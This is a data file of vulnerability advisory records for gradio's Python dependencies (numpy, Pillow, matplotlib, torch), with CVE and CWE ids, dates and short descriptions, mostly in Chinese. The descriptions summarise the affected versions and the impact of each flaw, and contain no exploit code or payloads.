gradio-app_gradio,numpy,,True,CVE-2017-12852,CWE-835,2017-08-15,"NumPy是一个Python科学计算包，它支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
Numpy 1.13.1及之前的版本中的‘numpy.pad’函数存在安全漏洞，该漏洞源于程序缺少输入验证。攻击者可利用该漏洞造成拒绝服务（无限循环）。",2,1
gradio-app_gradio,numpy,,True,CVE-2014-1859,CWE-59,2014-02-05,"NumPy是一个Python科学计算包，它支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。

NumPy 1.8.1之前的版本中的core/tests/test_memmap.py、core/tests/test_multiarray.py、f2py/f2py2e.py和lib/tests/test_io.py文件存在安全漏洞。本地攻击者可通过对临时文件实施符号链接攻击利用该漏洞覆盖任意文件。",2,0
gradio-app_gradio,Pillow,,True,,,2023-10-05,"## Duplicate Advisory
This advisory has been withdrawn because it is a duplicate of GHSA-56pw-mpj4-fxww. This link is maintained to preserve external references.

## Original Description
Pillow versions before v10.0.1 bundled libwebp binaries in wheels that are vulnerable to CVE-2023-5129 (previously CVE-2023-4863). Pillow v10.0.1 upgrades the bundled libwebp binary to v1.3.2.",2,-2
gradio-app_gradio,Pillow,,True,,CWE-400,2021-04-24,"### Impact
_Pillow before 8.1.1 allows attackers to cause a denial of service (memory consumption) because the reported size of a contained image is not properly checked for a BLP container, and thus an attempted memory allocation can be very large._

### Patches
_An issue was discovered in Pillow before 6.2.0. When reading specially crafted invalid image files, the library can either allocate very large amounts of memory or take an extremely long period of time to process the image._

### Workarounds
_An issue was discovered in Pillow before 6.2.0. When reading specially crafted invalid image files, the library can either allocate very large amounts of memory or take an extremely long period of time to process the image._

### References
https://nvd.nist.gov/vuln/detail/CVE-2021-27921

### For more information
If you have any questions or comments about this advisory:
* Open an issue in [example link to repo](http://example.com)
* Email us at [example email address](mailto:example@example.com)",2,2
gradio-app_gradio,Pillow,,True,,CWE-400,2022-03-12,"JpegImagePlugin may append an EOF marker to the end of a truncated file, so that the last segment of the data will still be processed by the decoder.

If the EOF marker is not detected as such however, this could lead to an infinite loop where JpegImagePlugin keeps trying to end the file.",4,-2
gradio-app_gradio,Pillow,,True,CVE-2022-45198,CWE-409,2022-11-14,"Pillow是一款基于Python的图像处理库。
Pillow 9.2.0之前版本存在安全漏洞，该漏洞源于对高度压缩的GIF数据处理不当。",2,2
gradio-app_gradio,Pillow,,True,CVE-2020-10994,CWE-125,2020-06-25,"Pillow是一款基于Python的图像处理库。
Pillow 7.1.0之前版本中的libImaging/Jpeg2KDecode.c文件存在缓冲区错误漏洞。该漏洞源于网络系统或产品在内存上执行操作时，未正确验证数据边界，导致向关联的其他内存位置上执行了错误的读写操作。攻击者可利用该漏洞导致缓冲区溢出或堆溢出等。",2,0
gradio-app_gradio,Pillow,,True,CVE-2016-4009,CWE-119,2016-04-13,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。
Pillow 3.1.1之前版本的libImaging/Resample.c文件中的‘ImagingResampleHorizontal’函数存在整数溢出漏洞。远程攻击者可借助负的‘new’的大小值利用该漏洞造成拒绝服务（基于堆的缓冲区溢出）。",1,2
gradio-app_gradio,Pillow,,True,CVE-2020-11538,CWE-125,2020-06-25,"Pillow是一款基于Python的图像处理库。
Pillow 7.0.0及之前版本中的libImaging/SgiRleDecode.c文件的SGI图像文件的处理存在缓冲区错误漏洞。该漏洞源于网络系统或产品在内存上执行操作时，未正确验证数据边界，导致向关联的其他内存位置上执行了错误的读写操作。攻击者可利用该漏洞导致缓冲区溢出或堆溢出等。",1,0
gradio-app_gradio,Pillow,,True,CVE-2021-27923,CWE-20,2021-03-03,"Pillow是Pillow开源的一款基于Python的图像处理库。
Pillow 8.1.1之前版本 存在输入验证错误漏洞，该漏洞允许攻击者导致拒绝服务。",2,2
gradio-app_gradio,Pillow,,True,CVE-2021-27922,CWE-20,2021-03-03,"Pillow是Pillow开源的一款基于Python的图像处理库。
Pillow 8.1.1之前版本 存在输入验证错误漏洞，该漏洞允许攻击者导致拒绝服务。",2,2
gradio-app_gradio,Pillow,,True,CVE-2021-27921,CWE-20,2021-03-03,"Pillow是Pillow开源的一款基于Python的图像处理库。
Pillow 8.1.1之前版本 存在输入验证错误漏洞，该漏洞允许攻击者导致拒绝服务。",2,2
gradio-app_gradio,Pillow,,True,CVE-2021-25290,CWE-787,2021-03-11,<p>Pillow是一款基于Python的图像处理库。 Pillow 8.1.1之前版本存在安全漏洞。该漏洞源于在TiffDecode.c中存在一个大小无效的负偏移memcpy。</p>,2,2
gradio-app_gradio,Pillow,,True,CVE-2021-25293,CWE-125,2021-03-11,"Pillow是一款基于Python的图像处理库。
Pillow 8.1.1版本之前存在安全漏洞。该漏洞源于SGIRleDecode.c中存在越界读取。",2,2
gradio-app_gradio,Pillow,,True,CVE-2021-25291,CWE-125,2021-03-11,"Pillow是一款基于Python的图像处理库。
Pillow 8.1.1之前版本中存在安全漏洞。该漏洞源于TiffDecode.c在TiffreadRGBATile中通过无效的title越界读取。",2,2
gradio-app_gradio,Pillow,,True,CVE-2020-35653,CWE-125,2021-01-11,"Pillow是一款基于Python的图像处理库。
Pillow 8.1.0之前版本中存在缓冲区错误漏洞，当解码一个精心制作的PCX文件时，PoxDecode有一个缓冲区过读，因为缓冲区计算信任用户提供的stride值。",2,0
gradio-app_gradio,Pillow,,True,,CWE-78,2020-11-02,"## Overview
[Pillow](https://python-pillow.org/) is a PIL (Python Imaging Library) fork.

Affected versions of this package are vulnerable to Command Injection in filenames that contain single quotes via `load_djpeg`.
## Remediation
Upgrade `Pillow` to version 2.5.0 or higher.
## References
- [GitHub PR](https://github.com/python-pillow/Pillow/pull/748)
- [Pillow Changelog](https://github.com/python-pillow/Pillow/blob/master/CHANGES.rst#250-2014-07-01)
",1,0
gradio-app_gradio,Pillow,,True,CVE-2020-10378,CWE-125,2020-06-25,"Pillow是一款基于Python的图像处理库。
Pillow 7.1.0之前版本中的libImaging/PcxDecode.c文件存在缓冲区错误漏洞。该漏洞源于网络系统或产品在内存上执行操作时，未正确验证数据边界，导致向关联的其他内存位置上执行了错误的读写操作。攻击者可利用该漏洞导致缓冲区溢出或堆溢出等。",2,0
gradio-app_gradio,Pillow,,True,CVE-2020-10177,CWE-125,2020-06-25,"Pillow是一款基于Python的图像处理库。
Pillow 7.1.0之前版本中的libImaging/FliDecode.c文件存在缓冲区错误漏洞。该漏洞源于网络系统或产品在内存上执行操作时，未正确验证数据边界，导致向关联的其他内存位置上执行了错误的读写操作。攻击者可利用该漏洞导致缓冲区溢出或堆溢出等。",2,0
gradio-app_gradio,Pillow,,True,CVE-2020-5312,CWE-120,2020-01-02,"Pillow是一款基于Python的图像处理库。
Pillow 6.2.2之前版本中的libImaging/PcxDecode.c文件存在缓冲区错误漏洞，该漏洞源于程序没有正确检查边界。远程攻击者可借助特制PCX文件利用该漏洞在系统上执行任意代码。",1,2
gradio-app_gradio,Pillow,,True,CVE-2020-5311,CWE-120,2020-01-02,"Pillow是一款基于Python的图像处理库。
Pillow 6.2.2之前版本中的libImaging/SgiRleDecode.c文件存在缓冲区错误漏洞，该漏洞源于程序没有正确检查边界。远程攻击者可借助特制SGI文件利用该漏洞在系统上执行任意代码，或者导致应用程序崩溃。",1,2
gradio-app_gradio,Pillow,,True,CVE-2020-5313,CWE-125,2020-01-02,"Pillow是一款基于Python的图像处理库。
Pillow 6.2.2之前版本中的libImaging/FliDecode.c文件存在缓冲区错误漏洞，该漏洞源于程序没有正确检查边界。远程攻击者可借助特制FLI文件利用该漏洞在系统上执行任意代码，或者导致应用程序崩溃。",2,0
gradio-app_gradio,Pillow,,True,CVE-2019-16865,CWE-770,2019-10-04,"Pillow是一款基于Python的图像处理库。
Pillow 6.2.0之前版本中存在安全漏洞。攻击者可利用该漏洞造成拒绝服务。",2,2
gradio-app_gradio,Pillow,,True,CVE-2016-9189,CWE-190,2016-11-04,"Pillow是美国软件开发者Alex Clark所研发的一个对PIL（Python图像处理库）一些BUG修正后的编译版。

Pillow 3.3.2之前的版本中存在安全漏洞。上下文相关的攻击者可利用该漏洞获取敏感信息。",3,0
gradio-app_gradio,Pillow,,True,CVE-2016-9190,CWE-284,2016-11-04,"Pillow是美国软件开发者Alex Clark所研发的一个对PIL（Python图像处理库）一些BUG修正后的编译版。

Pillow 3.3.2之前的版本中存在安全漏洞。上下文相关的攻击者可通过使用‘crafted image file’方法利用该漏洞执行任意代码。",2,0
gradio-app_gradio,Pillow,,True,CVE-2016-0775,CWE-119,2016-04-13,"Pillow是一款基于Python的图像处理库。
Pillow 3.1.1之前版本的libImaging/FliDecode.c文件中的‘ImagingFliDecode’函数存在缓冲区错误漏洞。远程攻击者可借助特制的FLI文件利用该漏洞造成拒绝服务（崩溃）。",2,0
gradio-app_gradio,Pillow,,True,CVE-2016-2533,CWE-119,2016-04-13,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。
Pillow 3.1.1之前版本和PIL 1.1.7及之前版本的PcdDecode.c文件中的‘ImagingPcdDecode’函数存在缓冲区溢出漏洞。远程攻击者可借助特制的PhotoCD文件利用该漏洞造成拒绝服务（崩溃）。",2,0
gradio-app_gradio,Pillow,,True,CVE-2014-1932,CWE-59,2014-04-17,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。Pillow是对PIL的一些BUG修正后的编译版。
PIL 1.1.7及之前的版本和Pillow 2.3.0及之前的版本中的JpegImagePlugin.py文件的‘load_djpeg’函数；EpsImagePlugin.py文件的‘Ghostscript’函数；IptcImagePlugin.py文件的‘load’函数；Image.py文件的‘_copy’函数存在安全漏洞，该漏洞源于程序没有正确创建临时文件。本地攻击者可通过对临时文件的符号链接攻击利用该漏洞覆盖任意文件，获取敏感信息。",2,0
gradio-app_gradio,Pillow,,True,CVE-2014-1933,CWE-264,2014-04-17,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。Pillow是对PIL的一些BUG修正后的编译版。
PIL 1.1.7及之前的版本和Pillow 2.3.0及之前的版本中的JpegImagePlugin.py和EpsImagePlugin.py脚本存在安全漏洞，该漏洞源于程序在命令行上使用临时文件名。本地攻击者可利用该漏洞实施符号链接攻击。",3,0
gradio-app_gradio,Pillow,,True,CVE-2016-0740,CWE-119,2016-04-13,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。
Pillow 3.1.1之前版本的libImaging/TiffDecode.c文件中的‘ImagingLibTiffDecode’函数存在缓冲区溢出漏洞。远程攻击者可借助特制的TIFF文件利用该漏洞覆盖内存。",3,0
gradio-app_gradio,Pillow,,True,CVE-2020-10379,CWE-120,2020-06-25,"Pillow是一款基于Python的图像处理库。
Pillow 7.1.0之前版本中的libImaging/TiffDecode.c文件存在缓冲区错误漏洞。该漏洞源于网络系统或产品在内存上执行操作时，未正确验证数据边界，导致向关联的其他内存位置上执行了错误的读写操作。攻击者可利用该漏洞导致缓冲区溢出或堆溢出等。",2,0
gradio-app_gradio,Pillow,,True,CVE-2022-24303,CWE-22,2022-02-03,"Pillow是一款基于Python的图像处理库。
Pillow 9.0.1之前版本存在输入验证错误漏洞，该漏洞源于产品的remove操作未验证用户输入数据。攻击者可通过该漏洞利用输入命令来修改或删除预期的命令。",2,2
gradio-app_gradio,Pillow,,True,CVE-2022-22815,CWE-665,2022-01-07,"Pillow是一款基于Python的图像处理库。
Pillow 9.0.0 之前存在安全漏洞，该漏洞源于 path.c 中的 path_getbbox 不正确地初始化 ImagePath.Path。",3,2
gradio-app_gradio,Pillow,,True,CVE-2022-22816,CWE-125,2022-01-07,"Pillow是一款基于Python的图像处理库。
Pillow 9.0.0 之前存在安全漏洞，该漏洞源于 path.c 中的 path_getbbox 在 ImagePath.Path 初始化期间有一个缓冲区过度读取。",3,2
gradio-app_gradio,Pillow,,True,CVE-2022-22817,CWE-94,2022-01-07,"Pillow是一款基于Python的图像处理库。
Pillow 9.0.0 之前存在安全漏洞，该漏洞源于 PIL.ImageMath.eval 允许评估任意表达式，例如使用 Python exec 方法的表达式。",1,2
gradio-app_gradio,Pillow,,True,,CWE-400,2022-01-04,"## Overview
[Pillow](https://python-pillow.org/) is a PIL (Python Imaging Library) fork.

Affected versions of this package are vulnerable to Denial of Service (DoS). The `JpegImagePlugin` may append an EOF marker to the end of a truncated file, so that the last segment of the data will still be processed by the decoder. If the EOF marker is not detected as such, this can lead to an infinite loop where `JpegImagePlugin` keeps trying to end the file.

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](https://snyk.io/vuln/npm:ws:20171108)

## Remediation
Upgrade `Pillow` to version 9.0.0 or higher.
## References
- [GitHub Commit](https://github.com/python-pillow/Pillow/pull/5921/commits/1059eb537639925c96d3245dcd73c106d4266c83)
- [GitHub Issue](https://github.com/python-pillow/Pillow/issues/5864#issuecomment-1003788821)
- [GitHub PR](https://github.com/python-pillow/Pillow/pull/5921)
- [Release Notes](https://pillow.readthedocs.io/en/stable/releasenotes/9.0.0.html#ensure-jpegimageplugin-stops-at-the-end-of-a-truncated-file)
",3,0
gradio-app_gradio,Pillow,,True,CVE-2021-34552,CWE-120,2021-07-13,"Pillow是一款基于Python的图像处理库。
Pillow 中存在缓冲区错误漏洞，该漏洞源于产品的convert .c未能验证参数的安全性，攻击者可通过该漏洞引发缓冲区溢出。以下产品及版本受到影响：Pillow 8.2.0 之前版本、PIL 1.1.7 之前版本。",1,2
gradio-app_gradio,Pillow,,True,CVE-2021-28677,CWE-20,2021-04-13,"Pillow是一款基于Python的图像处理库。
Pillow存在输入验证错误漏洞，该漏洞由于在处理换行符（例如在打开文件时使用“  r”，“  n”）时对用户提供的输入的验证不足而存在的。远程攻击者可以将特制文件传递给应用程序，并执行拒绝服务（DoS）攻击。以下产品及版本受到影响：Pillow 1.0、Pillow 1.2、Pillow 1.7.6、Pillow 1.7.7、Pillow 1.7.8、Pillow 2.0.0、Pillow 2.1.0、Pillow 2.2.0、Pillow 2.2.1、Pillow 2.2.2、Pillow 2.3.0、Pillow 2.3.1、Pillow 2.3.2、Pillow 2.4.0、Pillow 2.5.0、Pillow 2.5.1、Pillow 2.5.2、Pillow 2.5.3、Pillow 2.6.0、Pillow 2.6.1、Pillow 2.6.2、Pillow 2.7.0、Pillow 2.8.0、Pillow 2.8.1、Pillow 2.8.2、Pillow 2.9.0、Pillow 3.0.0、Pillow 3.1.0、Pillow 3.1.1、Pillow 3.1.2、Pillow 3.2.0、Pillow 3.3.0、Pillow 3.3.1、Pillow 3.3.2、Pillow 3.3.3、Pillow 3.4.0、Pillow 3.4.1、Pillow 3.4.2、Pillow 4.0.0、Pillow 4.1.0、Pillow 4.1.1、Pillow 4.2.0、Pillow 4.2.1、Pillow 4.3.0、Pillow 5.0.0、Pillow 5.1.0、Pillow 5.2.0、Pillow 5.3.0、Pillow 5.4.0、Pillow 5.4.1、Pillow 6.0.0、Pillow 6.1.0、Pillow 6.2.0、Pillow 6.2.1、Pillow 6.2.2、Pillow 6.2.3、Pillow 7.0.0、Pillow 7.0.1、Pillow 7.1.0、Pillow 7.1.1、Pillow 7.1.2、Pillow 7.2.0、Pillow 8.0.0、Pillow 8.0.1、Pillow 8.1.0、Pillow 8.1.1、Pillow 8.1.2。",2,2
gradio-app_gradio,Pillow,,True,CVE-2021-28675,CWE-252,2021-04-13,"Pillow是一款基于Python的图像处理库。
Pillow存在资源管理错误漏洞，该漏洞由于对PsdImagePlugin.PsdImageFile方法中的内部资源管理不当，远程攻击者可以将特制文件传递给应用程序，并执行拒绝服务（DoS）攻击。以下产品及版本受到影响：Pillow 1.0、Pillow 1.2、Pillow 1.7.6、Pillow 1.7.7、Pillow 1.7.8、Pillow 2.0.0、Pillow 2.1.0、Pillow 2.2.0、Pillow 2.2.1、Pillow 2.2.2、Pillow 2.3.0、Pillow 2.3.1、Pillow 2.3.2、Pillow 2.4.0、Pillow 2.5.0、Pillow 2.5.1、Pillow 2.5.2、Pillow 2.5.3、Pillow 2.6.0、Pillow 2.6.1、Pillow 2.6.2、Pillow 2.7.0、Pillow 2.8.0、Pillow 2.8.1、Pillow 2.8.2、Pillow 2.9.0、Pillow 3.0.0、Pillow 3.1.0、Pillow 3.1.1、Pillow 3.1.2、Pillow 3.2.0、Pillow 3.3.0、Pillow 3.3.1、Pillow 3.3.2、Pillow 3.3.3、Pillow 3.4.0、Pillow 3.4.1、Pillow 3.4.2、Pillow 4.0.0、Pillow 4.1.0、Pillow 4.1.1、Pillow 4.2.0、Pillow 4.2.1、Pillow 4.3.0、Pillow 5.0.0、Pillow 5.1.0、Pillow 5.2.0、Pillow 5.3.0、Pillow 5.4.0、Pillow 5.4.1、Pillow 6.0.0、Pillow 6.1.0、Pillow 6.2.0、Pillow 6.2.1、Pillow 6.2.2、Pillow 6.2.3、Pillow 7.0.0、Pillow 7.0.1、Pillow 7.1.0、Pillow 7.1.1、Pillow 7.1.2、Pillow 7.2.0、Pillow 8.0.0、Pillow 8.0.1、Pillow 8.1.0、Pillow 8.1.1、Pillow 8.1.2。",2,0
gradio-app_gradio,Pillow,,True,CVE-2021-28678,CWE-345,2021-04-13,"Pillow是一款基于Python的图像处理库。
Pillow存在数据伪造问题漏洞，该漏洞由于对PsdImagePlugin.PsdImageFile方法中的内部资源管理不当，远程攻击者可以将特制文件传递给应用程序，并执行拒绝服务（DoS）攻击。以下产品及版本受到影响：Pillow 1.0、Pillow 1.2、Pillow 1.7.6、Pillow 1.7.7、Pillow 1.7.8、Pillow 2.0.0、Pillow 2.1.0、Pillow 2.2.0、Pillow 2.2.1、Pillow 2.2.2、Pillow 2.3.0、Pillow 2.3.1、Pillow 2.3.2、Pillow 2.4.0、Pillow 2.5.0、Pillow 2.5.1、Pillow 2.5.2、Pillow 2.5.3、Pillow 2.6.0、Pillow 2.6.1、Pillow 2.6.2、Pillow 2.7.0、Pillow 2.8.0、Pillow 2.8.1、Pillow 2.8.2、Pillow 2.9.0、Pillow 3.0.0、Pillow 3.1.0、Pillow 3.1.1、Pillow 3.1.2、Pillow 3.2.0、Pillow 3.3.0、Pillow 3.3.1、Pillow 3.3.2、Pillow 3.3.3、Pillow 3.4.0、Pillow 3.4.1、Pillow 3.4.2、Pillow 4.0.0、Pillow 4.1.0、Pillow 4.1.1、Pillow 4.2.0、Pillow 4.2.1、Pillow 4.3.0、Pillow 5.0.0、Pillow 5.1.0、Pillow 5.2.0、Pillow 5.3.0、Pillow 5.4.0、Pillow 5.4.1、Pillow 6.0.0、Pillow 6.1.0、Pillow 6.2.0、Pillow 6.2.1、Pillow 6.2.2、Pillow 6.2.3、Pillow 7.0.0、Pillow 7.0.1、Pillow 7.1.0、Pillow 7.1.1、Pillow 7.1.2、Pillow 7.2.0、Pillow 8.0.0、Pillow 8.0.1、Pillow 8.1.0、Pillow 8.1.1、Pillow 8.1.2。",3,0
gradio-app_gradio,Pillow,,True,CVE-2021-28676,CWE-835,2021-04-13,"Pillow是一款基于Python的图像处理库。
Pillow存在安全漏洞，该漏洞由于对PsdImagePlugin.PsdImageFile方法中的内部资源管理不当，远程攻击者可以将特制文件传递给应用程序，并执行拒绝服务（DoS）攻击。以下产品及版本受到影响：Pillow 1.0、Pillow 1.2、Pillow 1.7.6、Pillow 1.7.7、Pillow 1.7.8、Pillow 2.0.0、Pillow 2.1.0、Pillow 2.2.0、Pillow 2.2.1、Pillow 2.2.2、Pillow 2.3.0、Pillow 2.3.1、Pillow 2.3.2、Pillow 2.4.0、Pillow 2.5.0、Pillow 2.5.1、Pillow 2.5.2、Pillow 2.5.3、Pillow 2.6.0、Pillow 2.6.1、Pillow 2.6.2、Pillow 2.7.0、Pillow 2.8.0、Pillow 2.8.1、Pillow 2.8.2、Pillow 2.9.0、Pillow 3.0.0、Pillow 3.1.0、Pillow 3.1.1、Pillow 3.1.2、Pillow 3.2.0、Pillow 3.3.0、Pillow 3.3.1、Pillow 3.3.2、Pillow 3.3.3、Pillow 3.4.0、Pillow 3.4.1、Pillow 3.4.2、Pillow 4.0.0、Pillow 4.1.0、Pillow 4.1.1、Pillow 4.2.0、Pillow 4.2.1、Pillow 4.3.0、Pillow 5.0.0、Pillow 5.1.0、Pillow 5.2.0、Pillow 5.3.0、Pillow 5.4.0、Pillow 5.4.1、Pillow 6.0.0、Pillow 6.1.0、Pillow 6.2.0、Pillow 6.2.1、Pillow 6.2.2、Pillow 6.2.3、Pillow 7.0.0、Pillow 7.0.1、Pillow 7.1.0、Pillow 7.1.1、Pillow 7.1.2、Pillow 7.2.0、Pillow 8.0.0、Pillow 8.0.1、Pillow 8.1.0、Pillow 8.1.1、Pillow 8.1.2。",2,2
gradio-app_gradio,Pillow,,True,CVE-2023-50447,CWE-94 CWE-95,2024-01-19,"Pillow是一款基于Python的图像处理库。
Pillow 10.1.0及之前版本存在安全漏洞，该漏洞源于可以通过PIL.ImageMath.eval中的environment 参数执行任意代码。",1,0
gradio-app_gradio,Pillow,,True,CVE-2023-44271,CWE-770,2023-11-03,"Pillow是一款基于Python的图像处理库。
Pillow 10.0.0之前版本存在安全漏洞，该漏洞源于不受控制地分配内存，从而导致服务崩溃。",2,2
gradio-app_gradio,Pillow,,True,CVE-2014-3589,CWE-20,2014-08-20,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。
PIL和Pillow 2.3.2之前版本和2.5.2版本之前2.5.x版本的PIL/IcnsImagePlugin.py文件中存在安全漏洞。远程攻击者可通过特制的块数据利用该漏洞造成拒绝服务。",2,2
gradio-app_gradio,Pillow,,True,CVE-2014-3007,CWE-78,2014-04-27,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。
PIL 1.1.7及之前的版本和Pillow 2.3版本中存在安全漏洞。远程攻击者可借助shell元字符利用该漏洞执行任意命令。",1,2
gradio-app_gradio,Pillow,,True,CVE-2020-35654,CWE-787,2021-01-11,"Pillow是一款基于Python的图像处理库。
Pillow 8.1.0之前版本中存在缓冲区错误漏洞，当解码制作好的YCbCr文件时，由于在RGBA模式下与LibTIFF的某些解释冲突，TiffDecode会出现基于堆的缓冲区溢出。",2,0
gradio-app_gradio,Pillow,,True,CVE-2019-19911,CWE-190,2020-01-05,"Pillow是一款基于Python的图像处理库。
Pillow 6.2.2之前版本中存在输入验证错误漏洞。攻击者可利用该漏洞造成拒绝服务（进程终止）。",2,2
gradio-app_gradio,Pillow,,True,CVE-2014-9601,CWE-20,2015-01-16,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。
Pillow 2.7.0之前版本中存在安全漏洞。远程攻击者可借助特制的PNG图像中压缩的文本块利用该漏洞造成拒绝服务。",2,2
gradio-app_gradio,Pillow,,True,CVE-2021-25289,CWE-787,2021-03-11,"Pillow是一款基于Python的图像处理库。
Pillow 8.1.1之前版本中存在安全漏洞。该漏洞源于在解码精心编制的YCbCr文件时，TiffDecode会出现基于堆的缓冲区溢出。",1,2
gradio-app_gradio,Pillow,,True,CVE-2020-5310,CWE-190,2020-01-02,"Pillow是一款基于Python的图像处理库。
Pillow 6.2.2之前版本中的libImaging/TiffDecode.c文件存在输入验证错误漏洞，该漏洞源于程序没有正确分配内存。远程攻击者可借助特制TIFF图像利用该漏洞导致应用程序崩溃。",1,0
gradio-app_gradio,Pillow,,True,CVE-2014-3598,CWE-399,2015-05-01,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。Jpeg2KImage是其中的一个图像处理插件。
PIL 2.5.3之前版本的Jpeg2KImagePlugin插件中存在安全漏洞。远程攻击者可借助特制的图像利用该漏洞造成拒绝服务。",2,2
gradio-app_gradio,Pillow,,True,CVE-2024-28219,CWE-680,2024-04-01,"Pillow是一款基于Python的图像处理库。
Pillow(PIL Fork)存在安全漏洞，该漏洞源于_imagingcms.c中存在缓冲区溢出漏洞。",2,0
gradio-app_gradio,numpy,,True,CVE-2019-6446,CWE-502,2019-01-16,<p>NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。 NumPy 1.16.0 版本及之前版本存在代码问题漏洞，该漏洞源于不安全地使用 pickle 模块。</p>,1,1
gradio-app_gradio,numpy,,True,CVE-2021-33430,CWE-120,2021-12-17,"NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.9版本存在缓冲区错误漏洞，该漏洞源于在ctor .c的 PyArray_NewFromDescr_int函数中缺少对于数组长度的限制，导致缓冲区溢出漏洞，当从Python代码指定大维度(超过32)的数组时，这可能会让恶意用户导致拒绝服务。",3,0
gradio-app_gradio,numpy,,True,CVE-2021-41495,CWE-476,2021-12-17,"NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.19存在代码问题漏洞，该漏洞源于。numpy存在空指针解引用漏洞。在软件中的PyArray_DescrNew函数中，由于缺少返回值验证，导致了空指针解引用漏洞、这允许攻击者可利用该漏洞通过重复创建排序数组来进行DoS攻击。",3,0
gradio-app_gradio,numpy,,True,CVE-2021-34141,CWE-697,2021-12-17,"NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.9存在安全漏洞，该漏洞源于软件中不完整的字符串比较。它允许攻击者可利用该漏洞通过构造特定的字符串对象来破坏api。",3,2
gradio-app_gradio,numpy,,True,CVE-2014-1858,CWE-20,2014-02-05,"NumPy是一个Python科学计算包，它支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.8.1之前的版本中的f2py的__init__.py文件存在安全漏洞。本地攻击者可通过对临时文件实施符号链接攻击利用该漏洞覆盖任意文件。",2,0
gradio-app_gradio,numpy,,True,CVE-2017-12852,CWE-835,2017-08-15,"NumPy是一个Python科学计算包，它支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
Numpy 1.13.1及之前的版本中的‘numpy.pad’函数存在安全漏洞，该漏洞源于程序缺少输入验证。攻击者可利用该漏洞造成拒绝服务（无限循环）。",2,1
gradio-app_gradio,numpy,,True,CVE-2014-1859,CWE-59,2014-02-05,"NumPy是一个Python科学计算包，它支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。

NumPy 1.8.1之前的版本中的core/tests/test_memmap.py、core/tests/test_multiarray.py、f2py/f2py2e.py和lib/tests/test_io.py文件存在安全漏洞。本地攻击者可通过对临时文件实施符号链接攻击利用该漏洞覆盖任意文件。",2,0
gradio-app_gradio,matplotlib,,True,CVE-2013-1424,CWE-120,2025-06-26,matplotlib 是一个用于生成图形和可视化的 Python 库，广泛应用于数据分析和科学计算领域。此组件提供了丰富的绘图功能，使用者可以创建各类复杂图表和图形。缓冲区溢出漏洞通常是由于程序未能正确限制输入的数据长度，导致攻击者发送过多数据，覆盖内存中的其他区域，从而可能执行任意代码。在这种情况下，matplotlib 在版本更新之前的某些操作中，由于缓冲区处理不当，可能引发缓冲区溢出。,3,0
gradio-app_gradio,torch,,True,CVE-2022-45907,CWE-94,2022-11-26,PyTorch是一个开源机器学习框架，提供张量计算、构建神经网络等功能。其torch.jit.annotations.parse_type_line组件存在代码注入漏洞，原因是对eval的使用不安全，导致潜在的任意代码执行。,1,2
gradio-app_gradio,torch,,True,CVE-2024-31580,CWE-122,2024-04-17,PyTorch是一个开源的Python包，主要用于张量计算和动态神经网络，并且具有强大的GPU加速功能。在v2.2.0之前的版本中，/runtime/vararg_functions.cpp组件中存在堆缓冲区溢出漏洞。由于函数的大小检查不当，攻击者可以通过提供精心构造的输入导致拒绝服务(DoS)，甚至可能执行任意代码。,2,0
gradio-app_gradio,torch,,True,CVE-2024-31583,CWE-416,2024-04-17,PyTorch 是一个以开源方式提供的 Python 库，专门用于神经网络构建与张量计算，具备强大的 GPU 加速能力。此漏洞涉及内存的释放后重用，位于 torch/csrc/jit/mobile/interpreter.cpp 组件中，由于内存管理不当可能导致此问题。攻击者可通过该漏洞执行任意代码或引发拒绝服务攻击。,2,0
gradio-app_gradio,torch,,True,CVE-2024-48063,CWE-502,2024-10-29,<p>PyTorch是一个由PyTorch开源社区提供的常用机器学习框架，广泛应用于深度学习和人工智能开发。此漏洞在PyTorch版本2.4.1及之前的版本中发现，该漏洞源于用于分布式RPC任务的RemoteModule模块。当应用程序允许从未经验证的来源加载和执行代码时，会导致远程代码执行漏洞。此漏洞会使攻击者能够在没有适当权限或安全审查的情况下执行任意代码。</p>,1,1
gradio-app_gradio,torch,,True,CVE-2025-3730,CWE-404,2025-04-16,PyTorch是一个广泛使用的开源深度学习框架，其提供了动态神经网络的构建和强力的GPU加速支持。该框架中的torch.nn.functional.ctc_loss函数在处理输入为空的张量时，会在文件 aten/src/ATen/native/LossCTC.cpp中引发拒绝服务漏洞。攻击者可以通过触发该漏洞使得系统崩溃，导致服务不可用。,3,0
